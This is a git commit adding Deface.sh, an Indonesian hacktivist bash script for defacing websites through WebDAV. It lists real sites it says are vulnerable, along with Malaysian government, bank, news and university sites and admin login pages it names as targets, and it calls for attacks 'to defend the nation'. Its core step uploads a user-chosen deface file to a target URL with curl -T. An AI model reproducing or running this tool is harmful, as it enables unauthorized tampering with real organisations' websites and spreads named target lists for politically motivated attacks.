1b97c54e2ef84afb72980c419fbd6e7d60757338
BajinganCyberArmy <49521386+BajinganCyberArmy@users.noreply.github.com>
2019-04-12 10:46:30 +0700

    Add files via upload

---
+++ Deface.sh
@@ -0,0 +1,84 @@
+clear
+sleep 1
+echo "[+] Tunggu Bentar Cuk..." | lolcat
+sleep 3
+clear
+figlet Wellcome Cuk | lolcat
+sleep 2
+clear
+echo "_______________________________________________________
+
+                [ Tools Deface Webdav ]
+
+[+] Coded   : BarTest Mr.F47
+[+] Team    : BajinganCyberArmy (private)
+[+] Github  : https://github.com/BajinganCyberArmy 
+[×] Contact : *89536*5614**
+
+_______________________________________________________" | lolcat
+sleep 1
+echo "[+] Waiting For Server.." | lolcat
+sleep 3
+echo "[+] Jika Belum Punya Web Vuln Webdav,Bisa ambil di sini" | lolcat
+sleep 2
+echo "_____________________________________
+
+ http://bajingan.com/
+
+﻿http://africaprop.co.za/
+
+ http://ballastbrokers.co.za/
+
+ http://www.ajaxfilebrowser.com/
+
+ http://hq.prospec.co.th/
+
+ http://branch.prospec.co.th/
+
+ http://bestilling.udir.no
+_____________________________________" | lolcat
+sleep 1
+echo "__________________________________________________________________________
+Live Gann Malaysia  Yang Melanggar Zona Perbatasan Indonesia
+
+https://applevacations.my/
+https://www.expedia.com.my/
+https://malaysia.gov.my/
+http://www.mpkluang.gov.my/
+https://www.thestar.com.my/
+http://www.computradetech.com.my/
+http://www.jpbdselangor.gov.my/
+http://malaysiatravel.my
+https://www.tourism.gov.my
+http://educationmalaysia.gov.my
+http://www.ukm.my
+https://masenangtravel.com.my/
+https://www.oneshop.com.my/
+https://www.alliancebank.com.my
+https://www.cimbbank.com.my/
+
+
+http://www.mrcastor.com.my/admin/index.php
+http://galeriilmu.com.my/v5/admin/index.php?route=common/dashboard
+https://www.gloo.com.my/admin/index.php?route=common/login
+
+lancarkan serangan untuk membela negara
+we are figther ,we do not friend ,we are Family
+
+[∆] B4J1N64N Cyber Team [∆]
+__________________________________________________________________________" | lolcat
+
+echo "[+] Website Target : " $target |lolcat
+read target
+echo "[+] Tunggu.." | lolcat
+sleep 2
+echo "[+] Nama Script Defacenya : " $sc |lolcat
+read sc
+curl -T /storage/emulated/0/$sc $target
+echo "[+] Cek Websitenya Pake .html" | lolcat
+sleep 2
+echo "[+] Done!! " | lolcat
+sleep 10
+figlet Thanks Dah Mampir | lolcat
+sleep 5
+clear
